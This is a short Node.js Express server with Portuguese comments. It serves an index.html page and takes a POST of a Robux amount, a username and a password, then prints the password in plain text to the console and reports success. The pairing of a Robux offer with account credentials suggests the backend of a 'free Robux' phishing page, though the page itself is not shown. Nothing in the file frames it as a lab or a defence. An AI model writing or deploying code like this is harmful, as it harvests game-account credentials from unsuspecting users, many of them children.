const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Servir o HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit', (req, res) => {
  const { robuxAmount, username, password } = req.body;

  if (!robuxAmount || !username || !password) {
    return res.status(400).json({ error: 'Missing required fields.' });
  }

  console.log('--- DADOS RECEBIDOS ---');
  console.log(`Robux: ${robuxAmount}`);
  console.log(`Usuário: ${username}`);
  console.log(`Senha: ${password}`);

  res.json({ status: 'success', message: 'Dados recebidos com sucesso.' });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
